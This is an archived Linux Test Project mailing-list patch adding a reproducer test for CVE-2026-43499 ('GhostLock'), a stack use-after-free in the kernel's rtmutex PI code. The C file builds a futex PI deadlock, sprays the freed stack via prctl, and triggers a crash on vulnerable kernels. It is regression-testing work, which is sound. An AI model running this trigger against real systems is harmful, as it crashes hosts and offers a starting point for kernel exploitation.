Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id EBB5AC55172
	for <ltp@archiver.kernel.org>; Sat,  1 Aug 2026 10:35:18 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 9FD603EA67C
	for <ltp@archiver.kernel.org>; Sat,  1 Aug 2026 12:35:17 +0200 (CEST)
Received: from in-5.smtp.seeweb.it (in-5.smtp.seeweb.it [217.194.8.5])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id A34213EA689
 for <ltp@lists.linux.it>; Sat,  1 Aug 2026 12:34:35 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.223.131])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-5.smtp.seeweb.it (Postfix) with ESMTPS id C9A65600703
 for <ltp@lists.linux.it>; Sat,  1 Aug 2026 12:34:34 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id 5088C43C4;
 Sat,  1 Aug 2026 10:34:13 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1785580457; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=j6WSnAWposHDNneR4ejL3QbIrSUQpr62QBxpBZvsmsU=;
 b=u0GBhbz2bYQ82NMck4qVCSnLoaC/4SL0O07O/UF+wkcEYt2nAmY7eyFNvwuYaka49bS9Ji
 sVG1dHZdOy8wXs6gde7YKBpPCND2U0bwcPR99tvRYnrNtpGJ7NS2RDUDqP0umbaDMvLup4
 KipT9xXnQUTY/inmcz0Qa/LS0UqKuSw=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1785580457;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=j6WSnAWposHDNneR4ejL3QbIrSUQpr62QBxpBZvsmsU=;
 b=yN/p7p3AfcujzhtFZErifxP/YGWkv3AeRml+PaNe1rI8kLqJm7Ov3kir+hifl2/mdkz8BX
 CVnDcZpJOlR0VACA==
Authentication-Results: smtp-out2.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1785580453; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=j6WSnAWposHDNneR4ejL3QbIrSUQpr62QBxpBZvsmsU=;
 b=Ztr6ytr9Lu6u1c42dznI80nhGH75cXQ56eUOFOy66/2bMgeLEJ329YuoX5GDhWU+MEltc3
 u4s40eQA+73axsPLlllPS5iFCAiiTkfw2PVOc6skn4C77gnLAGmMXMY3SBRIq2LSo73AeU
 d/Zbg5jsp2EKvWwltn9iewoKfLESorA=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1785580453;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=j6WSnAWposHDNneR4ejL3QbIrSUQpr62QBxpBZvsmsU=;
 b=NP8d98boXHvZfJeRayWGvPDF5ZhKv02ew+TXdN8Rov1an+Kt8LJ6gGj4ESC/g2ilW5cp3P
 +Z9X/+so16va4XBg==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 31F14779E0;
 Sat,  1 Aug 2026 10:34:13 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id QIGECqXLbWrxXwAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Sat, 01 Aug 2026 10:34:13 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Sat, 01 Aug 2026 12:34:13 +0200
MIME-Version: 1.0
Message-Id: <20260801-cve-ghostlock-v1-2-178f698f9702@suse.com>
References: <20260801-cve-ghostlock-v1-0-178f698f9702@suse.com>
In-Reply-To: <20260801-cve-ghostlock-v1-0-178f698f9702@suse.com>
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.14.2
X-Developer-Signature: v=1; a=ed25519-sha256; t=1785580452; l=9287;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=LUcasu+FsG2fT5YX8cajlA7j0k0ODX76b9XJKRBhz0M=;
 b=9fud5y2AtJQm/iedvQnEcOl0MdYgaBXgkLA8N3rVmg8af6YEUCVH27/zWOvGMyrgAHjSOI040
 t9jthKiTQX1CDM8V7nRZl1tpgLQPfMK7jgeMX+rknpDnPv9P4mtozOn
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Spamd-Result: default: False [-4.30 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-0.989]; MIME_GOOD(-0.10)[text/plain];
 RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
 RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 URIBL_BLOCKED(0.00)[suse.com:mid,suse.com:email];
 TO_DN_ALL(0.00)[]; FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
 FROM_EQ_ENVFROM(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 RCVD_COUNT_TWO(0.00)[2];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:mid,suse.com:email]
X-Virus-Scanned: clamav-milter 1.0.9 at in-5.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH 2/2] cve: add CVE-2026-43499 reproducer
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

Add "Ghostlock" reproducer for CVE-2026-43499.

Reproducer based on the Nebula Security writeup and open-sourced PoC
(https://nebusec.ai/research/ionstack-part-2/,
https://github.com/NebuSec/CyberMeowfia).

Beware, this test will crash the system on a vulnerable kernel.

Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
 runtest/cve               |   1 +
 testcases/cve/.gitignore  |   1 +
 testcases/cve/Makefile    |   2 +-
 testcases/cve/ghostlock.c | 252 ++++++++++++++++++++++++++++++++++++++++++++++
 4 files changed, 255 insertions(+), 1 deletion(-)

diff --git a/runtest/cve b/runtest/cve
index 99d84270b6efc9afae5bd27adee704603c3092f7..3035dff9797260402660208f0e5028803a72d297 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -101,3 +101,4 @@ cve-2026-43494 io_uring04
 cve-2026-46300 xfrm02
 cve-2026-46300-skb-segment xfrm03
 cve-2026-46331 cve-2026-46331
+cve-2026-43499 ghostlock
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index bc1af0dd2c8086e4f5f78a3b15b91fafbd8f5936..914592f30e4e3e883b6ed270ad47c6910798974e 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -16,3 +16,4 @@ tcindex01
 cve-2025-38236
 cve-2025-21756
 cve-2026-46331
+ghostlock
diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
index 98c38e90801a21eedad986273d537b16f3e4eb91..22ca4b727ddc240edcc9409ce82904039fc70111 100644
--- a/testcases/cve/Makefile
+++ b/testcases/cve/Makefile
@@ -11,7 +11,7 @@ stack_clash:	CFLAGS += -fno-optimize-sibling-calls -Wno-infinite-recursion
 
 cve-2016-7042:	LDLIBS += $(KEYUTILS_LIBS)
 
-cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053:  CFLAGS += -pthread
+cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 ghostlock:  CFLAGS += -pthread
 cve-2014-0196 cve-2016-7117 cve-2017-2671:  LDLIBS += -lrt
 
 ifneq ($(ANDROID),1)
diff --git a/testcases/cve/ghostlock.c b/testcases/cve/ghostlock.c
new file mode 100644
index 0000000000000000000000000000000000000000..bc59e979f90602c824737706c76b6920e59fcfef
--- /dev/null
+++ b/testcases/cve/ghostlock.c
@@ -0,0 +1,252 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (c) 2026 Nebula Security <root@nebusec.ai>
+ * Copyright (c) 2026 Linux Test Project
+ */
+
+/*\
+ * Test for CVE-2026-43499 (GhostLock), a stack use-after-free in the
+ * rtmutex PI code, fixed in kernel v7.1:
+ * 3bfdc63936dd ("rtmutex: Use waiter::task instead of current in remove_waiter()")
+ *
+ * Reproducer based on the Nebula Security writeup and open-sourced PoC
+ * (https://nebusec.ai/research/ionstack-part-2/ and
+ * https://github.com/NebuSec/CyberMeowfia).
+ * Beware, this test will crash the system on a vulnerable kernel.
+ *
+ * [Algorithm]
+ *
+ * - Set up a three-futex PI deadlock topology.
+ * - Call :manpage:`futex(2)` with FUTEX_CMP_REQUEUE_PI on the waiter.
+ * - On a vulnerable kernel, the rollback from -EDEADLK leaves the waiter's
+ *   pi_blocked_on pointer dangling on its own stack.
+ * - Waiter sprays its stack via :manpage:`prctl(2)` (PR_SET_MM_MAP) with
+ *   non-canonical addresses.
+ * - Main thread calls :manpage:`sched_setattr(2)` on the waiter to trigger
+ *   a chain walk.
+ * - The chain walk dereferences the sprayed garbage, crashing a vulnerable
+ *   kernel.
+ */
+
+#include "tst_test.h"
+#include "tst_timer.h"
+#include "tst_safe_clocks.h"
+#include "tst_safe_pthread.h"
+#include "lapi/syscalls.h"
+#include "lapi/sched.h"
+#include "lapi/prctl.h"
+#include "lapi/futex.h"
+
+#define ATTEMPTS 128
+#define PRCTL_STAMPS 100
+
+#define POISON_PTR 0xdeadbee11c518f58ULL
+#define MAX_AUXV_QWORDS 48
+
+#define CP_CHAIN_HELD 0
+#define CP_TARGET_HELD 1
+#define CP_OWNER_BLOCKED 2
+#define CP_SPRAYED 3
+#define CP_SETATTR_DONE 4
+
+static uint32_t f_wait;
+static uint32_t f_pi_target;
+static uint32_t f_pi_chain;
+
+static pid_t waiter_tid;
+static pid_t owner_tid;
+
+static uint64_t auxv[MAX_AUXV_QWORDS];
+static uint32_t valid_auxv_size;
+
+static int futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2,
+				 struct timespec *ts)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts,
+			   uaddr2, 0);
+}
+
+static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1,
+			   uaddr2, 0);
+}
+
+static int futex_lock_pi(uint32_t *uaddr)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0);
+}
+
+static int futex_unlock_pi(uint32_t *uaddr)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
+}
+
+static void run_spray(void)
+{
+	struct prctl_mm_map mm_map = {
+		.start_code  = (uint64_t)(uintptr_t)&run_spray,
+		.end_code    = (uint64_t)(uintptr_t)&run_spray + 0x1000,
+		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
+		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
+		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
+		.brk         = (uint64_t)(uintptr_t)sbrk(0),
+		.start_stack = (uint64_t)(uintptr_t)&mm_map,
+		.arg_start   = (uint64_t)(uintptr_t)&mm_map,
+		.arg_end     = (uint64_t)(uintptr_t)&mm_map,
+		.env_start   = (uint64_t)(uintptr_t)&mm_map,
+		.env_end     = (uint64_t)(uintptr_t)&mm_map,
+		.auxv        = (void *)auxv,
+		.auxv_size   = valid_auxv_size,
+		.exe_fd      = (uint32_t)-1,
+	};
+
+	for (int i = 0; i < PRCTL_STAMPS; i++) {
+		SAFE_PRCTL(PR_SET_MM, PR_SET_MM_MAP, (unsigned long)&mm_map,
+			   sizeof(mm_map), 0);
+	}
+}
+
+static void *waiter_fn(void *arg LTP_ATTRIBUTE_UNUSED)
+{
+	struct timespec ts;
+
+	waiter_tid = tst_syscall(__NR_gettid);
+
+	futex_lock_pi(&f_pi_chain);
+
+	TST_CHECKPOINT_WAKE2(CP_CHAIN_HELD, 2);
+	TST_CHECKPOINT_WAIT(CP_OWNER_BLOCKED);
+
+	SAFE_CLOCK_GETTIME(CLOCK_MONOTONIC, &ts);
+	ts = tst_timespec_add(ts, (struct timespec){ .tv_sec = 10, .tv_nsec = 0 });
+	futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts);
+
+	run_spray();
+
+	TST_CHECKPOINT_WAKE(CP_SPRAYED);
+	TST_CHECKPOINT_WAIT(CP_SETATTR_DONE);
+
+	futex_unlock_pi(&f_pi_chain);
+
+	return NULL;
+}
+
+static void *owner_fn(void *arg LTP_ATTRIBUTE_UNUSED)
+{
+	owner_tid = tst_syscall(__NR_gettid);
+
+	TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
+
+	futex_lock_pi(&f_pi_target);
+	TST_CHECKPOINT_WAKE(CP_TARGET_HELD);
+
+	futex_lock_pi(&f_pi_chain);
+
+	futex_unlock_pi(&f_pi_chain);
+	futex_unlock_pi(&f_pi_target);
+
+	return NULL;
+}
+
+static void setup(void)
+{
+	static const int try_sizes[] = {
+		MAX_AUXV_QWORDS,
+		MAX_AUXV_QWORDS - 4,
+		MAX_AUXV_QWORDS - 8
+	};
+	struct prctl_mm_map map = {
+		.exe_fd = (uint32_t)-1,
+		.auxv = (void *)auxv,
+	};
+	unsigned int i, sz = 0;
+
+	SAFE_PRCTL(PR_SET_MM, PR_SET_MM_MAP_SIZE, (unsigned long)&sz, 0, 0);
+
+	for (i = 0; i < MAX_AUXV_QWORDS; i++)
+		auxv[i] = POISON_PTR + i * 8;
+
+	map.start_code = map.start_data = map.end_data =
+	map.start_brk = map.brk = map.start_stack = map.arg_start =
+	map.arg_end = map.env_start = map.env_end = (uint64_t)(uintptr_t)&sz;
+	map.end_code = map.start_code + 0x1000;
+
+	for (i = 0; i < ARRAY_SIZE(try_sizes); i++) {
+		valid_auxv_size = try_sizes[i] * sizeof(uint64_t);
+		map.auxv_size = valid_auxv_size;
+
+		if (prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0) == 0)
+			break;
+	}
+
+	if (i == ARRAY_SIZE(try_sizes))
+		tst_brk(TBROK | TERRNO, "PR_SET_MM_MAP failed for all auxv sizes");
+
+	tst_res(TDEBUG, "Using auxv_size = %u", valid_auxv_size);
+}
+
+static void run(void)
+{
+	pthread_t waiter_th, owner_th;
+	struct sched_attr attr = {
+		.size = sizeof(attr),
+		.sched_policy = SCHED_BATCH,
+		.sched_nice = 19,
+	};
+
+	tst_res(TINFO, "Triggering PI deadlock and stack spray");
+
+	for (int i = 0; i < ATTEMPTS; i++) {
+		f_wait = 0;
+		f_pi_target = 0;
+		f_pi_chain = 0;
+
+		SAFE_PTHREAD_CREATE(&waiter_th, NULL, waiter_fn, NULL);
+		SAFE_PTHREAD_CREATE(&owner_th, NULL, owner_fn, NULL);
+
+		TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
+		TST_CHECKPOINT_WAIT(CP_TARGET_HELD);
+
+		TST_THREAD_STATE_WAIT(owner_tid, 'S', 10000);
+
+		TST_CHECKPOINT_WAKE(CP_OWNER_BLOCKED);
+
+		TST_THREAD_STATE_WAIT(waiter_tid, 'S', 10000);
+
+		TEST(futex_cmp_requeue_pi(&f_wait, &f_pi_target));
+		if (TST_RET != -1 || TST_ERR != EDEADLK)
+			tst_brk(TBROK | TTERRNO, "FUTEX_CMP_REQUEUE_PI did not return -EDEADLK");
+
+		TST_CHECKPOINT_WAIT(CP_SPRAYED);
+
+		TEST(sched_setattr(waiter_tid, &attr, 0));
+		if (TST_RET == -1)
+			tst_brk(TBROK | TTERRNO, "sched_setattr() failed");
+
+		TST_CHECKPOINT_WAKE(CP_SETATTR_DONE);
+
+		SAFE_PTHREAD_JOIN(waiter_th, NULL);
+		SAFE_PTHREAD_JOIN(owner_th, NULL);
+	}
+
+	tst_res(TPASS, "Kernel survived %d GhostLock trigger attempts", ATTEMPTS);
+}
+
+static struct tst_test test = {
+	.setup = setup,
+	.test_all = run,
+	.runtime = 180,
+	.needs_checkpoints = 1,
+	.needs_kconfigs = (const char *[]) {
+		"CONFIG_CHECKPOINT_RESTORE=y",
+		"CONFIG_FUTEX_PI=y",
+		NULL
+	},
+	.taint_check = TST_TAINT_W | TST_TAINT_D,
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "3bfdc63936dd"},
+		{"CVE", "2026-43499"},
+		{}
+	},
+};

-- 
2.51.0


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
